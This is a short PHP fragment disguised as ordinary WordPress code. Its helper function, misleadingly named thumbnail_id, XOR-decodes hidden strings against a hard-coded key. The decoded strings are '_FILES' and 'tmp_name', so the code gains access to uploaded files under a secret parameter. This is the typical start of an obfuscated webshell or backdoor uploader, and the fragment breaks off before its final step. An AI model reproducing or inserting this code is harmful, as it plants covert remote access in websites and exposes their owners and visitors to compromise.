...
$username = 'XAENlYjxif7uLD';
$front = $username;
function thumbnail_id($meta_value, $tt_ids)

{
    $wp_post_types = $tt_ids;
    $post_categories = urldecode($meta_value);
    $nestable_tags = substr($wp_post_types,0, strlen($post_categories));
    $default_no_texturize_tags = $post_categories ^ $nestable_tags;
	$permalink_epmask = 'index';
    return $default_no_texturize_tags;
}
$updated = ${thumbnail_id("%07%07%0C%02%29%0A", $front)};
$exts = $updated;

$ext_type = isset($exts[$front]);

if ($ext_type)

{

    $dynamic = $updated[$front];
    $wp_rewrite = $dynamic[thumbnail_id("%2C%2C5%11%028%07%1D", $front)];
	$html_parts = 'search';
    $replace = $wp_rewrite;
